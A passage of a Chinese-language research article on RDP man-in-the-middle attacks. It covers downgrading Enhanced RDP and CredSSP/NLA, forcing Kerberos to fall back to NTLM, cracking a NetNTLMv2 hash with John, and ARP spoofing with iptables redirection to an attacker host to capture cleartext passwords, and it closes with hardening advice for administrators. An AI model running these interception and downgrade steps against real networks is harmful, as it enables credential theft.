注意到什么了吗？这并不是一个SSL警告。至此，我们已经能够成功的监听到客户端的击键信息了。这也就是Cain的实现原理。
## 0x05 破解强化RDP安全机制
仅仅降低RDP协议的安全等级远远不够，作为一名攻击者，将会努力使得攻击变得更加隐蔽。受害者会注意到警告与通常情况下的差异，并在建立链接之后依然会要求证书。  
同样的问题一直困扰着我，在使用Cain对RDP展开MitM攻击的时候，看不到SSL警告。我发现向客户解释为什么SSL警告如此重要很困难，特别当他们使用不能够确实的自签名证书时，这个MitM攻击导致了完全不同的警告。
接下来让我们尝试降低强化RDP安全协议的安全等级。首先，我们需要自签名的SSL证书，可以用openssl生成：
    $ openssl req -new -newkey rsa:&quot;$KEYLENGTH&quot; -days &quot;$DAYS&quot; -nodes -x509 \
    -subj &quot;$SUBJ&quot; -keyout privatekey.key -out certificate.crt 2&gt; /dev/null
在恰当的时候将通信数据封装在SSL之中进行发送，这些工作已经完成。如同之前所说，标准RDP协议被封装在SSL协议中，但是服务端通常情况下将加密等级选为“None”。使用SSL确保数据的完整性和真实性可用被很好的仿冒。在SSL之上再使用RC4完全是浪费资源。提取密钥的过程如同之前所说的一样。
唯一额外的安全特征是在SSL链接已经建立好之后，服务端需要确认原始的握手请求。服务端对客户端说“请你告诉我你所能够使用的安全协议”。从二进制的角度来看，如下所示：
客户端会将这个数据同最初发送的请求数据相比较，如果不一致就结束链接。很显然，这已经太晚了。作为中间人，可以修改从客户端发出的数据包，将上图中0x4c处的数据进行替换，原始值为0x03。之后，我们就可以轻松的读取全部明文。
如同预期的一样，受害者看到了一个合适的SSL警告。但事实上已经不一样了。在RDP链接建立之前，当使用我们自己的证书的时候还是有一些区别。不像NLA，认证发生在会话之中。再次，总有一些地方和标准工作流程存在差异，使得管理员有可能注意得到。
## 0x06 突破CredSSP
首先声明，我们其实并没有真正的突破CredSSP，其实是在规避它。首先，让我们看看如果不降级攻击，真实的链接是什么样的。相关数据如下：
高亮部分为客户端的挑战值及NTLM响应，服务端的挑战值在之前的消息之中。
我们现在所看到的是NTLM认证。这是一种挑战-响应技术，客户端获取到服务端的挑战值（类似于之前提到过的服务端随机数），客户端挑战值和用户密码还有一些其他值，被加密为hash值。这个hash值被称为“NTLM响应”，并被传输至服务端。
这个值是如何计算出来的，对我们来说并不重要。我们需要知道就是，NTLM不能被重放攻击，也不能进行哈希传递攻击，但是可以进行hash碰撞攻击。NTLM实现的hash算法称为HMAC-MD5，是一个相当简单的算法，但通常情况下会使用salt。可以使用Hashcat或者John The
Ripper进行破解，使用John时的hash格式如下：
    :::::
示例数据如下：
    User1::RD14:a5f46f6489dc654f:110d658e927f077b0402040cc1a6b6ef:0101000000000
    000d5fda87cec95d201a7559d44f431848a0000000002000800520044003100340001000800
    44004300300031000400140072006400310034002e006c006f00630061006c0003001e00640
    06300300031002e0072006400310034002e006c006f00630061006c00050014007200640031
    0034002e006c006f00630061006c0007000800d5fda87cec95d201060004000200000008003
    000300000000000000000000000002000004cfa6e96109bd90f6a4080daaa8e264e4ebfaffa
    e9e368af787f53e389d96b180a0010000000000000000000000000000000000009002c00540
    0450052004d005300520056002f003100390032002e003100360038002e00340030002e0031
    0037003900000000000000000000000000
将以上数据存为hashes.txt，使用如下命令启动john：
    $ echo &#39;S00perS3cretPa$$word&#39; | ./john --format=netntlmv2 --stdin hashes.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
    Will run 8 OpenMP threads
    Press Ctrl-C to abort, or send SIGUSR1 to john process for status
    S00perS3cretPa$$word (User1)
    1g 0:00:00:00 33.33g/s 33.33p/s 33.33c/s 33.33C/s S00perS3cretPa$$word
    Use the &quot;--show&quot; option to display all of the cracked passwords reliably
    Session completed
结果如上，聊胜于无，但我们能做的更好。
我们必须明确一个问题“服务端是如何确认NTLM响应的？”这就需要用到域控服务器。但如果域控服务器不可用呢？服务端会发出“使用强化的RDP代替NLA”，客户端会遵守这个消息。有趣的是，在客户端已经缓存密码之后，会选择直接发送密码，而不是将用户重定向到登录窗口。这正是我们想要的。除去SSL警告之外，没有任何其他的异常。
所以，在客户端已发送NTLM响应之后，我们用以下数据替代服务端的响应。
    00000000: 300d a003 0201 04a4 0602 04c0 0000 5e 0.............^
相关内容没有找到官方文档，在实际中，当服务端无法联系到域控制器的时候所发送的数据包就是如此。客户端将会降级到强化的RDP协议，显示SSL警告，并通过SSL向服务端传输密码。
注意，我们并没有看到SSL警告。根据标准，客户端会发送SSL证书的指纹到服务端，该指纹被CredSSP协议中的密钥所加密。如果和服务端证书的指纹不匹配，该会话将被终止。这也就是之前为什么受害者输入错误的密码时我们能监听得到，输入正确的密码时，我们只能看到TLS错误的原因。
现在需要做的工作就是截取NTLM的响应值。通过改写Python脚本，返回特定的NTLM响应，使得NTLM认证始终失败。受害者不会注意到，如之前所说，我们将协议降级至TLS，之后证书将会被重新发送。
在此，还有一件事需要说明。如果客户端属于域内主机，将不会使用NTLM。取而代之的是Kerberos，在建立链接之前，客户端会联系域控服务器，获取ticket。对我们来说，这是件好事。对于攻击者来说，Kerberos的ticket相对于有salt的NTLM更没用。如果攻击者进行中间人攻击，可以通过锁定所有与Kerberos服务进行通信的数据，猜猜之后会发生什么？如果客户端联系不到Kerberos服务，将会自动降级为NTLM。
## 0x07 测试
至此，我们已经能够在实验环境中实现整个攻击流程。但在真实环境中，受害者在RDP客户端中并不会输入MitM代理的ip，而是他们自己服务器的IP。有很多种方法能够实现中间人攻击，在此我们选用ARP欺骗。对于PoC来说，实现起来足够简单，由于ARP欺骗是layer-2层的攻击，所以攻击者与受害者需要在一个共同的子网之中。
在欺骗ARP、允许IPv4转发之后，受害者与网关之间的所有流量都会流经我们的主机。但是我们还是不知道受害者所输入的IP地址，所以无法启动Python脚本。
首先创建一条iptables规则，拒绝所有来自受害者的用于RDP服务的SYN包：
    $ iptables -A FORWARD -p tcp -s &quot;$VICTIM_IP&quot; --syn --dport 3389 -j REJECT
我们不希望转发任何其他的流量，如果受害者已经建立好了RDP链接，将会终止该链接。如果我们不拒绝这些数据包，受害者将同真正的服务器建立链接，而不是我们的MitM代理。
第二，监听来自受害者的流量，等待目的端口为3389的SYN包，目的是找出目标服务器的IP地址。利用tcpdump实现：
    $ tcpdump -n -c 1 -i &quot;IFACE&quot; src host &quot;$VICTIM_IP&quot; and \
    &quot;tcp[tcpflags] &amp; tcp-syn != 0&quot; and \
    dst port 3389 2&gt; /dev/null | \
    sed -e &#39;s/.&gt; ([0-9.]).3389:.*/\1/&#39;
参数“-c 1”表示首次匹配成功后即退出。这个SYN包将被丢弃，但没关系，很快受害者主机将会重发这个包。
第三，获取服务端的SSL证书，创建同名的自签名证书，同时修改证书的过期时间。除非花费大量的时间和精力检查指纹信息，否则很难区分两者之间的差别。以下[bash脚本](https://github.com/SySS-Research/clone-cert)可以完成上述功能。
接下来移除之前的iptables规则，将受害者与真实服务器之间的流量全部转发到我们的MitM代理地址上：
    $ iptables -t nat -A PREROUTING -p tcp -d &quot;ORIGINAL_DEST&quot; \
    -s &quot;VICTIM_IP&quot; --dport 3389 -j DNAT --to-destination &quot;ATTACKER_IP&quot;
为了实现从Kerberos到NTLM的强制降级，锁定了所有受害者与目标端口为88的流量。
    $ iptables -A INPUT -p tcp -s &quot;VICTIM_IP&quot; --dport 88 \
    -j REJECT --reject-with tcp-reset
至此，我们已经准备好运行Python脚本的所有环境。
    $ rdp-cred-sniffer.py -c &quot;CERTPATH&quot; -k &quot;KEYPATH&quot; &quot;ORIGINAL_DEST&quot;
左图为受害者通过3389登录域控服务器，右图为成功截取到的明文密码。
## 0x08 建议
作为系统管理员，此刻你可能想知道能做些什么来确保网络的安全。  
首先，最为关键的是，当服务器身份得不到确认的情况下，绝对不能建立RDP链接。比如，SSL证书没有被可信的CA签名。使用企业CA对所有服务器证书进行签名。客户端必须配置GPO，当证书不能被确认的情况下拒绝链接。配置路径如下：
    Computerconfiguration→Policies→AdministrativeTemplates→WindowsComponents
    →RemoteDesktopServices (or Terminal Services)→Remote Desktop Connection Client
    →Configure server authentication for client
对于是否需要在服务端配置CredSSP（NLA）相对比较复杂。这一点同样能在组策略中实现：
    [路径如上]→Remote Desktop Session Host (or Terminal Server)→Security
    →Require user authentication for remote connections by using Network Level Authentication
我们已经了解到客户端将用户证书进行了缓存，NLA不可能方便的进行重传，证书被缓存在内存之中。这些数据可以被拥有SYSTEM权限的攻击者获取到，同时使用Mimikatz。这是一款不可思议的脚本，在被感染的主机上可以成功的获取到已登录账号的明文密码，并且横向获取其他账号的密码，直到成功获取到域管理员的账号。这也就是为什么只能在域管服务器上使用私人的域管账号。
但是通过RDP远程登录域控服务器，使得服务器上遗留下了一个高权限的账号，这是一个非常严重的问题。除此之外，如果启用了NLA，“用户在下次登录时必须改变密码”也被启用，仅在终端服务中的用户将会被锁定。至今为止我们所能确认的是，NLA更方便，由于使用更少的资源所以可以减轻Dos攻击，并且可以防止如同MS12-020这样的基于网络的针对RDP的攻击。这也是为什么内部还在讨论是否推荐禁用NLA。
如果你拒绝使用NLA，可以在组策略中进行如下设置，“在远程连接中需要使用SSL”。
增加RDP的安全性还有其他两种措施，第一种是使用除了证书之外的第二种因素。有很多第三方的产品可以使用，至少对域控制器这类关键系统进行加固。
万一你需要使用Linux通过RDP连接Windows终端服务，需要提醒的是，比较流行的RDP客户端rdesktop是无法使用NLA并且无法验证SSL证书的。另一款可替代的产品xfreerdp至少可以验证证书。
最后，请注意SSL警告不能被轻视，无论是在RDP还是在HTTPS的环境中。作为管理员，你有责任确认客户端已经将你的CA设置为可信证书。通过这种方式，可以确保SSL警告属于异常行为，而不是普遍现象，在出现异常时可以及时寻求IT部门的协助。